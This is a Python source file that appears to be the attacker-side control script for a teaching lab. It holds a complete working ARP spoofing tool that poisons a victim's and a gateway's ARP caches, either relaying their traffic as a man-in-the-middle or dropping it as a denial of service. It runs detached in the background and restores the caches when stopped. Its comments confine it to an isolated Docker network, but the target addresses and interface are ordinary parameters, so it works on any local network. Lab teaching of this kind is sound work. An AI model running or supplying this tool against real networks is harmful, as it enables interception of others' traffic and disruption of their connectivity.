#!/usr/bin/env python3
"""
ARP spoofing control script for the isolated arp-lab-net teaching lab.

Everything here only ever talks to hosts inside arp-lab-net (10.10.10.0/24,
a `internal: true` Docker network with no route to the host LAN or the
internet). It is invoked exclusively via `docker exec` by the Module 2
backend — see README.md in this folder for the exact commands.

Usage:
    python3 arp_spoof.py start --mode mitm      # or --mode dos
    python3 arp_spoof.py stop
    python3 arp_spoof.py status

start forks a detached background process that:
  1. learns the *real* MAC addresses of the victim and gateway with a
     genuine ARP request (so it knows what to restore later),
  2. every 2 seconds sends forged ARP replies telling the victim "I am the
     gateway" and telling the gateway "I am the victim",
  3. in mode=mitm also enables IP forwarding inside this container, so
     traffic that now flows through the attacker keeps working (classic
     on-path MITM); in mode=dos forwarding is left off, so traffic that
     arrives here is simply dropped (a denial-of-service against the link).

stop sends SIGTERM to that background process, which sends correct
ARP replies to restore both caches, disables forwarding, and exits.
"""
import argparse
import os
import signal
import sys
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp

PID_FILE = "/tmp/arp_spoof.pid"
LOG_FILE = "/tmp/arp_spoof.log"
IFACE = os.environ.get("IFACE", "eth0")

VICTIM_IP = os.environ.get("VICTIM_IP", "10.10.10.10")
GATEWAY_IP = os.environ.get("GATEWAY_IP", "10.10.10.1")


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    try:
        print(line, flush=True)
    except (BrokenPipeError, OSError):
        pass
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass


def get_mac(ip, iface=IFACE, timeout=3):
    """Resolve ip's real MAC with one genuine ARP request, before we start
    forging anything — this is how we later know what to restore."""
    try:
        req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(req, timeout=timeout, iface=iface, verbose=0)
        for _, r in ans:
            return r[Ether].src
    except Exception as e:
        log(f"srp exception for {ip}: {e}")

    # Fallback to kernel ARP table /proc/net/arp
    try:
        with open("/proc/net/arp") as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip and parts[3] != "00:00:00:00:00:00":
                    return parts[3]
    except OSError:
        pass

    return None


def send_forged_reply(target_ip, target_mac, spoof_ip, iface=IFACE):
    """Tell target_ip that spoof_ip now lives at *our* MAC."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply ("is-at")
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )
    sendp(pkt, iface=iface, verbose=0)


def send_real_reply(target_ip, target_mac, real_ip, real_mac, iface=IFACE):
    """Restore target_ip's table with the correct real mapping.
    Sends both an ARP Reply (op=2) and an ARP Request (op=1).
    Per RFC 826 and Linux kernel arp.c, passive hosts (like the default gateway)
    drop unsolicited ARP replies unless actively soliciting, but always update
    their cache on incoming ARP requests announcing the sender's real IP and MAC.
    """
    pkt_reply = Ether(dst=target_mac, src=real_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )
    pkt_req = Ether(dst="ff:ff:ff:ff:ff:ff", src=real_mac) / ARP(
        op=1,
        pdst=target_ip,
        hwdst="00:00:00:00:00:00",
        psrc=real_ip,
        hwsrc=real_mac,
    )
    sendp([pkt_reply, pkt_req], iface=iface, count=3, verbose=0)


def set_ip_forward(enabled: bool):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1" if enabled else "0")
    except OSError as e:
        log(f"could not set ip_forward: {e}")


def poison_loop(victim_ip, gateway_ip, mode):
    my_mac = get_if_hwaddr(IFACE)
    log(f"attacker MAC on {IFACE} = {my_mac}")

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    if not victim_mac or not gateway_mac:
        log(f"initial MAC resolution timed out (victim={victim_mac}, gateway={gateway_mac}). Retrying...")
        for _ in range(5):
            time.sleep(1)
            victim_mac = victim_mac or get_mac(victim_ip)
            gateway_mac = gateway_mac or get_mac(gateway_ip)
            if victim_mac and gateway_mac:
                break

    if not victim_mac or not gateway_mac:
        log("FATAL: could not resolve real MACs for victim/gateway, aborting")
        try:
            os.remove(PID_FILE)
        except OSError:
            pass
        sys.exit(1)

    log(f"real MACs learned: victim={victim_mac} gateway={gateway_mac}")

    def handle_term(signum, frame):
        log(f"received signal {signum}; restoring ARP tables and exiting")
        set_ip_forward(False)
        send_real_reply(victim_ip, victim_mac, gateway_ip, gateway_mac)
        send_real_reply(gateway_ip, gateway_mac, victim_ip, victim_mac)
        try:
            os.remove(PID_FILE)
        except OSError:
            pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_term)
    signal.signal(signal.SIGINT, handle_term)

    if mode == "mitm":
        set_ip_forward(True)
        log("mode=mitm: IP forwarding ENABLED — attacker relays traffic both ways")
    else:
        set_ip_forward(False)
        log("mode=dos: IP forwarding left DISABLED — traffic routed through us is dropped")

    log(f"poisoning started: victim={victim_ip} gateway={gateway_ip} mode={mode}")
    while True:
        send_forged_reply(victim_ip, victim_mac, gateway_ip)   # "I am the gateway"
        send_forged_reply(gateway_ip, gateway_mac, victim_ip)  # "I am the victim"
        time.sleep(2)


def cmd_start(args):
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                pid = int(f.read().strip())
            # Check if process is actually running
            os.kill(pid, 0)
            print("a poison process already appears to be running (pid file exists)")
            sys.exit(1)
        except (ProcessLookupError, ValueError):
            # Stale PID file, clean up and proceed
            pass

    pid = os.fork()
    if pid > 0:
        # parent: record the child pid and return immediately
        with open(PID_FILE, "w") as f:
            f.write(str(pid))
        print(f"started background poison process, pid={pid}, mode={args.mode}")
        sys.exit(0)

    # child: fully detach from the exec'd shell and run forever
    os.setsid()
    try:
        sys.stdin.close()
    except Exception:
        pass
    try:
        devnull = open(os.devnull, "w")
        sys.stdout = devnull
        sys.stderr = devnull
    except Exception:
        pass
    poison_loop(args.victim, args.gateway, args.mode)


def cmd_stop(_args):
    if not os.path.exists(PID_FILE):
        print("no poison process is running")
        return
    try:
        with open(PID_FILE) as f:
            pid = int(f.read().strip())
    except (OSError, ValueError):
        print("invalid pid file")
        return

    try:
        os.kill(pid, signal.SIGTERM)
        print(f"sent SIGTERM to pid {pid}; ARP tables will be restored")
    except ProcessLookupError:
        print("process already gone, cleaning up stale pid file")
        try:
            os.remove(PID_FILE)
        except OSError:
            pass


def cmd_status(_args):
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            print("running")
            return
        except (ProcessLookupError, ValueError):
            pass
    print("stopped")


def main():
    parser = argparse.ArgumentParser(description="ARP spoofing control for arp-lab-net")
    sub = parser.add_subparsers(dest="command", required=True)

    p_start = sub.add_parser("start")
    p_start.add_argument("--mode", choices=["mitm", "dos"], default="mitm")
    p_start.add_argument("--victim", default=VICTIM_IP)
    p_start.add_argument("--gateway", default=GATEWAY_IP)
    p_start.set_defaults(func=cmd_start)

    p_stop = sub.add_parser("stop")
    p_stop.set_defaults(func=cmd_stop)

    p_status = sub.add_parser("status")
    p_status.set_defaults(func=cmd_status)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    conf.verb = 0
    main()
